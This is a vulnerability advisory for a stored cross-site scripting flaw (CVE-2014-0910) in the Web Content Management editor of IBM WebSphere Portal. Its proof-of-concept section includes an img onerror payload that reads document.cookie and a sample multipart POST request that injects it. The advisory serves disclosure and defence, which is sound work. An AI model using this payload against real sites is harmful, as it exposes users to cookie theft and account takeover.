@@ -1,0 +1,70 @@
+IBM WebSphere Portal Stored Cross-Site Scripting Vulnerability [CVE-2014-0910]
+
+[+] Author: Filippo Roncari
+[+] Target: IBM WebSphere Portal
+[+] Version: 7.0, 6.1.5, 6.1.0
+[+] Vendor: http://www.ibm.com
+[+] Accessibility: Remote
+[+] Severity: Medium
+[+] CVE: CVE-2014-0910
+[+] Full Advisory: https://www.securenetwork.it/docs/advisory/SN-14-04-IBM.pdf
+[+] Info: f.roncari@securenetwork.it 
+
+
+[+] Summary
+IBM WebSphere Portal is a leader in the market product that provides enterprise web portals to help companies deliver a highly-personalized, social experience for their customers. IBM WebSphere Portal gives users a single point of access to the applications, services, information and social connections they need.
+
+
+[+] Vulnerability Details
+IBM WebSphere Portal is prone to a stored Cross-Site Scripting (XSS) vulnerability in the Web Content Management component, which allows authenticated users to inject arbitrary JavaScript.
+A potential attacker authenticated to the Web Content Management can exploit this vulnerability by creating a malicious web content and persuading the victim to visit it. This issue can lead to different kind of user-targeted attacks such as cookie stealing and account violation.
+
+
+[+] Technical Details
+View full advisory at https://www.securenetwork.it/docs/advisory/SN-14-04-IBM.pdf for technical details and source code.
+
+
+[+] Proof of Concept (PoC)
+Authors are able to insert HTML tags through the HTML view of the Rich Text Editor when creating a new web content, although active scripts are blocked and not executed. However it is possible to inject arbitrary JavaScript using a licit tag such as "img". Rich Text Editor tries to correctly handle the tag allowing client-side script being executed. A trivial payload like the following can be used:
+
+	[!] Sample Payload
+	-------------------------
+	<img src=a onerror=alert(document.cookie)>
+	-------------------------
+
+An exemplifying HTTP request is reported below. 
+
+	[!] PoC HTTP Request
+	-------------------------
+	POST portal/!ut/p/b1/pZHLboMwEEW_KLJJeC5HGHAQkJZQCt5EzqMmx[...] HTTP/1.1 Host:
+	Proxy-Connection: keep-alive
+	Content-Length: 20108
+	Cache-Control: max-age=0
+	Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryAzBIVym1up1GRKBv Accept: application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: gzip,deflate,sdch
+	Accept-Language: it-IT,it;q=0.8,en-US;q=0.6,en;q=0.4
+	Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.3
+
+	------W ebKitFormBoundaryAzBIVym1up1GRKBv
+	Content-Disposition: form-data; name="PC_Z7_CGAH47L00OJ790IAH1AFAN1GT0000000_wh"
+
+	save_and_read_controllable
+	------W ebKitFormBoundaryAzBIVym1up1GRKBv
+	Content-Disposition: form-data; name="PC_Z7_CGAH47L00OJ790IAH1AFAN1GT0000000_wa"
+
+	[...] true
+	------W ebKitFormBoundaryAzBIVym1up1GRKBv
+	Content-Disposition: form-data; name="cmpnt_map_19W14388ed1e14Content_inithtml"
+
+	------W ebKitFormBoundaryAzBIVym1up1GRKBv
+	Content-Disposition: form-data; name="PC_Z7_CGAH47L00OJ790IAH1AFAN1GT0000000_cmpnt_map_19W14388ed1e14Content"
+
+	<img src=a onerror=alert(document.cookie)>
+	------W ebKitFormBoundaryAzBIVym1up1GRKBv
+	Content-Disposition: form-data; name="cmpnt_map_19W14388ed1e14_RTE"
+	-------------------------
+
+For further details and explanations check the full advisory.	
+
+
+[+] Disclaimer
+Permission is hereby granted for the redistribution of this alert, provided that it is not altered except by reformatting it, and that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit is given to the author.
